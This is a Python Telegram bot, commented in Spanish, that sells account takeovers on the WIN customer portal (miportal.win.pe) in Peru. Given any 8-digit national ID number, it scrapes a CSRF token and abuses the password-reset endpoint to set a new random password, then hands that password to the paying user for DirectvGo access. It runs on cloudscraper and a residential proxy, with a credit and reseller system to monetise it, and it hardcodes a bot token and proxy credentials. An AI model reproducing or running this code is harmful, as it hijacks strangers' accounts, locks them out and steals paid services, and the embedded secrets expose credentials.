import cloudscraper
import re
import random
import string
from telegram.ext import Application, CommandHandler, MessageHandler, filters
from telegram import Update
from telegram.ext import ContextTypes
import asyncio
import logging
import os
import json
# Importar el comando buy
from user_commands.buy import buy_command

# Configurar logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# TOKEN DE TU BOT (cámbialo por tu token real)
TOKEN = "8078352881:AAE79T3W0MbApatNoUJ2t_I7t43GfPwKj9M"

# Configuración del proxy
PROXY = "http://user-h3z4n7npfiun-region-pe:VoSNeVGUwr0s1@va.lunaproxy.com:12233"

# Carpeta y archivo para administración
ADMIN_FOLDER = "admin_panel"
CREDITOS_FILE = os.path.join(ADMIN_FOLDER, "creditos.json")
RESELLER_FILE = os.path.join(ADMIN_FOLDER, "resellers.json")
ADMIN_USER_IDS = [6660537848]  # ID del creador/admin
RESELLER_USER_IDS = [1111111111, 2222222222]  # IDs de resellers, pon aquí los IDs de los resellers

def generar_contrasenia_random():
    """
    Genera una contraseña aleatoria de 10 caracteres con el formato:
    - Primera letra: Mayúscula
    - Siguientes 7: Letras minúsculas
    - Octavo carácter: Un dígito (0-9)
    - Último carácter: !
    Ejemplo: Xlqhbydh9!
    """
    primera_letra = random.choice(string.ascii_uppercase)
    letras_minusculas = ''.join(random.choice(string.ascii_lowercase) for _ in range(7))
    digito = random.choice(string.digits)
    contrasenia = primera_letra + letras_minusculas + digito + '!'
    return contrasenia

def procesar_documento(documento):
    """
    Procesa el documento y devuelve el resultado de la API
    """
    try:
        ss = cloudscraper.session()
        
        # Configuración del proxy
        proxy_config = {
            # 'http': PROXY,
            'https': PROXY
        }
        ss.proxies.update(proxy_config)

        # Headers iniciales
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        }

        # Obtener el token CSRF
        get = ss.get("https://miportal.win.pe/", headers=headers)
        
        print(get.text)
        patron = r"new Login\('([^']+)'"
        match = re.search(patron, get.text)
        
        if not match:
            return "❌ Error: No se pudo obtener el token de autenticación"
        
        valor_capturado = match.group(1)
        nueva_contrasenia = generar_contrasenia_random()

        # Headers para la petición POST
        headers_post = {
            "sec-ch-ua-platform": "Windows",
            "X-CSRF-TOKEN": valor_capturado,
            "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            "sec-ch-ua-mobile": "?0",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Accept": "*/*",
            "Origin": "https://miportal.win.pe",
            "Referer": "https://miportal.win.pe/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "es-ES,es;q=0.9"
        }

        # Datos para el POST
        pdata = {
            "documento": documento,
            "password": nueva_contrasenia
        }

        # Realizar petición
        response = ss.post("https://miportal.win.pe/remember-pass", headers=headers_post, data=pdata)
        valdate = response.text

        # Procesar respuesta
        if 'Error en la actualizacion de password' in valdate:
            return f"❌ Error al cambiar contraseña para el documento: {documento}"
        elif 'Password actualizado' in valdate:
            return f"✅ Contraseña cambiada exitosamente!\n\n📄 Documento: {documento}\n🔐 Nueva contraseña: {nueva_contrasenia}"
        else:
            return f"⚠️ Respuesta desconocida:\n{valdate}"

    except Exception as e:
        return f"❌ Error en el procesamiento: {str(e)}"

# Funciones para manejar créditos
def cargar_creditos():
    if not os.path.exists(CREDITOS_FILE):
        return {}
    with open(CREDITOS_FILE, "r") as f:
        return json.load(f)

def guardar_creditos(creditos):
    os.makedirs(ADMIN_FOLDER, exist_ok=True)
    with open(CREDITOS_FILE, "w") as f:
        json.dump(creditos, f)

def obtener_creditos(user_id):
    creditos = cargar_creditos()
    datos = creditos.get(str(user_id))
    if datos is None:
        return 0
    if isinstance(datos, dict):
        return datos.get("creditos", 0)
    return datos  # compatibilidad con formato anterior

def modificar_creditos(user_id, cantidad, reseller_id=None):
    creditos = cargar_creditos()
    datos = creditos.get(str(user_id), {})
    if isinstance(datos, dict):
        datos["creditos"] = cantidad
        if reseller_id is not None:
            datos["reseller_id"] = reseller_id
    else:
        datos = {"creditos": cantidad}
        if reseller_id is not None:
            datos["reseller_id"] = reseller_id
    creditos[str(user_id)] = datos
    guardar_creditos(creditos)

def sumar_creditos(user_id, cantidad, reseller_id=None):
    creditos = cargar_creditos()
    datos = creditos.get(str(user_id), {})
    if isinstance(datos, dict):
        datos["creditos"] = datos.get("creditos", 0) + cantidad
        if reseller_id is not None:
            datos["reseller_id"] = reseller_id
    else:
        datos = {"creditos": cantidad}
        if reseller_id is not None:
            datos["reseller_id"] = reseller_id
    creditos[str(user_id)] = datos
    guardar_creditos(creditos)

def obtener_reseller(user_id):
    creditos = cargar_creditos()
    datos = creditos.get(str(user_id), {})
    if isinstance(datos, dict):
        return datos.get("reseller_id")
    return None

def cargar_resellers():
    if not os.path.exists(RESELLER_FILE):
        return []
    with open(RESELLER_FILE, "r") as f:
        return json.load(f)

def guardar_resellers(resellers):
    os.makedirs(ADMIN_FOLDER, exist_ok=True)
    with open(RESELLER_FILE, "w") as f:
        json.dump(resellers, f)

def es_reseller(user_id):
    resellers = cargar_resellers()
    return user_id in resellers

# Comando /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    username = f"@{user.username}" if user.username else "(sin username)"
    texto = (
        f"𝐁𝐢𝐞𝐧𝐯𝐞𝐧𝐢𝐝𝐨 {user_id}, estimado usuario este bot te permite cambiar contraseñas de los accesos win para acceder a DirectvGo\n"
        "╔════════════════════\n"
        "║👤 𝗗𝗔𝗧𝗢𝗦 𝗗𝗘𝗟 𝗨𝗦𝗨𝗔𝗥𝗜𝗢 👤\n"
        "╠════════════════════\n"
        f"║🕵️‍♂️ 𝑼𝒔𝒖𝒂𝒓𝒊𝒐 ⮕ {user_id}\n"
        "╠════════════════════\n"
        f"║💻 𝑨𝒍𝒊𝒂𝒔       ⮕ {username}\n"
        "╠════════════════════\n"
        "║ COMANDOS DISPONIBLES \n"
        "╠════════════════════\n"
        "║/start  - iniciar bot \n"
        "║/menu - muestra comandos disponibles\n"
        "║/dni - Cambiar contraseña usando un documento \n"
        "║/buy - compra creditos\n"
        "╚════════════════════"
    )
    imagen_path = os.path.join(os.path.dirname(__file__), "imagenes", "coco.jpg")
    with open(imagen_path, "rb") as img:
        await update.message.reply_photo(img, caption=texto)

# Comando /dni
async def dni_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    creditos = obtener_creditos(user_id)
    if creditos <= 0:
        await update.message.reply_text("❌ No tienes créditos suficientes para usar este comando.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Por favor proporciona un número de documento.\n\nEjemplo: /dni 12345678")
        return
    
    documento = context.args[0]
    
    # Validar que sea solo números
    if not documento.isdigit():
        await update.message.reply_text("❌ El documento debe contener solo números.")
        return
    
    # Validar longitud (DNI peruano típicamente 8 dígitos)
    if len(documento) != 8:
        await update.message.reply_text("❌ El documento debe tener 8 dígitos.")
        return
    
    # Enviar mensaje de procesamiento
    processing_msg = await update.message.reply_text("🔄 Procesando documento... Por favor espera.")
    
    # Procesar el documento
    resultado = procesar_documento(documento)
    
    # Restar crédito
    modificar_creditos(user_id, creditos - 1)
    
    # Editar el mensaje con el resultado
    await processing_msg.edit_text(resultado)

# Comando para ver créditos
async def creditos_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    creditos = obtener_creditos(user_id)
    await update.message.reply_text(f"💳 Tus créditos disponibles: {creditos}")

# Comando para setear créditos (admin o reseller)
async def setcreditos_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_USER_IDS and not es_reseller(user_id):
        await update.message.reply_text("❌ No tienes permisos para usar este comando.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Uso: /setcreditos <user_id> <cantidad>")
        return
    target_id = context.args[0]
    cantidad = int(context.args[1])
    # Solo admin puede asignar a cualquiera, reseller solo a sus clientes
    if user_id in RESELLER_USER_IDS:
        # Si el usuario no tiene reseller, lo asigna; si ya tiene, solo si es su cliente
        reseller_actual = obtener_reseller(target_id)
        if reseller_actual is not None and reseller_actual != user_id:
            await update.message.reply_text("❌ No puedes asignar créditos a usuarios de otro reseller.")
            return
        modificar_creditos(target_id, cantidad, reseller_id=user_id)
        await update.message.reply_text(f"✅ Créditos actualizados para el usuario {target_id}: {cantidad} (Reseller: {user_id})")
    else:
        modificar_creditos(target_id, cantidad)
        await update.message.reply_text(f"✅ Créditos actualizados para el usuario {target_id}: {cantidad}")

# Comando para que el admin agregue un reseller
async def addreseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_USER_IDS:
        await update.message.reply_text("❌ Solo el admin puede asignar resellers.")
        return
    if not context.args:
        await update.message.reply_text("Uso: /addreseller <user_id>")
        return
    target_id = int(context.args[0])
    resellers = cargar_resellers()
    if target_id in resellers:
        await update.message.reply_text("⚠️ Este usuario ya es reseller.")
        return
    resellers.append(target_id)
    guardar_resellers(resellers)
    await update.message.reply_text(f"✅ El usuario {target_id} ahora es reseller.")

# Comando para mostrar el panel de administración
async def adminpanel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_USER_IDS:
        await update.message.reply_text("❌ No tienes permisos para acceder al panel de administración.")
        return
    texto = (
        "🛠️ Panel de Administración\n\n"
        "Comandos disponibles:\n"
        "/vercreditos <user_id> - Ver créditos de un usuario\n"
        "/setcreditos <user_id> <cantidad> - Asignar créditos a un usuario\n"
        "/listcreditos - Ver todos los usuarios y sus créditos (solo admin)\n"
    )
    await update.message.reply_text(texto)

# Comando para ver créditos de cualquier usuario (admin o reseller)
async def vercreditos_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_USER_IDS and not es_reseller(user_id):
        await update.message.reply_text("❌ No tienes permisos para usar este comando.")
        return
    if not context.args:
        await update.message.reply_text("Uso: /vercreditos <user_id>")
        return
    target_id = context.args[0]
    reseller_actual = obtener_reseller(target_id)
    if es_reseller(user_id) and reseller_actual != user_id:
        await update.message.reply_text("❌ No puedes ver créditos de usuarios de otro reseller.")
        return
    creditos = obtener_creditos(target_id)
    await update.message.reply_text(f"💳 Créditos del usuario {target_id}: {creditos}")

# Comando para listar todos los créditos (solo admin)
async def listcreditos_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_USER_IDS:
        await update.message.reply_text("❌ No tienes permisos para usar este comando.")
        return
    creditos = cargar_creditos()
    if not creditos:
        await update.message.reply_text("No hay usuarios registrados.")
        return
    texto = "📋 Créditos de usuarios:\n"
    for uid, datos in creditos.items():
        if isinstance(datos, dict):
            texto += f"ID: {uid} - Créditos: {datos.get('creditos', 0)} - Reseller: {datos.get('reseller_id', 'N/A')}\n"
        else:
            texto += f"ID: {uid} - Créditos: {datos}\n"
    await update.message.reply_text(texto)

# Comando para listar clientes de un reseller
async def listclientes_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not es_reseller(user_id):
        await update.message.reply_text("❌ Solo los resellers pueden usar este comando.")
        return
    creditos = cargar_creditos()
    texto = "📋 Tus clientes:\n"
    hay_clientes = False
    for uid, datos in creditos.items():
        if isinstance(datos, dict) and datos.get("reseller_id") == user_id:
            texto += f"ID: {uid} - Créditos: {datos.get('creditos', 0)}\n"
            hay_clientes = True
    if not hay_clientes:
        texto += "No tienes clientes registrados."
    await update.message.reply_text(texto)

# Comando /menu actualizado
async def menu_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in ADMIN_USER_IDS:
        texto = (
            "📋 Menú de Comandos (Admin/Creador)\n\n"
            "Comandos de usuario:\n"
            "  /start - Información del bot\n"
            "  /dni <documento> - Cambiar contraseña usando un documento\n"
            "  /creditos - Ver tus créditos\n"
            "  /menu - Ver este menú\n\n"
            "Comandos de administración:\n"
            "  /setcreditos <user_id> <cantidad> - Asignar créditos a un usuario\n"
            "  /vercreditos <user_id> - Ver créditos de un usuario\n"
            "  /listcreditos - Ver todos los usuarios y sus créditos\n"
            "  /adminpanel - Mostrar panel de administración\n"
            "  /addreseller <user_id> - Asignar reseller\n"
            "  /resellerpanel - Menú exclusivo para resellers\n"
        )
    elif es_reseller(user_id):
        texto = (
            "📋 Menú de Comandos (Reseller)\n\n"
            "Comandos de usuario:\n"
            "  /start - Información del bot\n"
            "  /dni <documento> - Cambiar contraseña usando un documento\n"
            "  /creditos - Ver tus créditos\n"
            "  /menu - Ver este menú\n\n"
            "Comandos de reseller:\n"
            "  /setcreditos <user_id> <cantidad> - Asignar créditos a tus clientes\n"
            "  /vercreditos <user_id> - Ver créditos de tus clientes\n"
            "  /listclientes - Ver todos tus clientes y sus créditos\n"
            "  /resellerpanel - Menú exclusivo para resellers\n"
        )
    else:
        texto = (
            "📋 Menú de Comandos (Usuario)\n\n"
            "  /start - Información del bot\n"
            "  /dni <documento> - Cambiar contraseña usando un documento\n"
            "  /creditos - Ver tus créditos\n"
            "  /menu - Ver este menú\n"
        )
    await update.message.reply_text(texto)

# Comando /resellerpanel para mostrar menú exclusivo del reseller
async def resellerpanel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not es_reseller(user_id):
        await update.message.reply_text("❌ Solo los resellers pueden acceder a este panel.")
        return
    texto = (
        "🛠️ Panel de Reseller\n\n"
        "Comandos disponibles:\n"
        "  /setcreditos <user_id> <cantidad> - Asignar créditos a tus clientes\n"
        "  /vercreditos <user_id> - Ver créditos de tus clientes\n"
        "  /listclientes - Ver todos tus clientes y sus créditos\n"
        "  /menu - Ver menú general\n"
    )
    await update.message.reply_text(texto)

# Función principal
def main():
    # Crear la aplicación
    app = Application.builder().token(TOKEN).build()
    
    # Agregar handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("dni", dni_command))
    app.add_handler(CommandHandler("creditos", creditos_command))
    app.add_handler(CommandHandler("setcreditos", setcreditos_command))
    app.add_handler(CommandHandler("adminpanel", adminpanel_command))
    app.add_handler(CommandHandler("vercreditos", vercreditos_command))
    app.add_handler(CommandHandler("listcreditos", listcreditos_command))
    app.add_handler(CommandHandler("menu", menu_command))
    app.add_handler(CommandHandler("listclientes", listclientes_command))
    app.add_handler(CommandHandler("addreseller", addreseller_command))
    app.add_handler(CommandHandler("resellerpanel", resellerpanel_command))
    app.add_handler(CommandHandler("buy", buy_command))
    
    # Mensaje de inicio
    print("🤖 Bot iniciado correctamente...")
    print("📱 Esperando comandos...")
    
    # Iniciar el bot
    app.run_polling()

if __name__ == "__main__":
    main()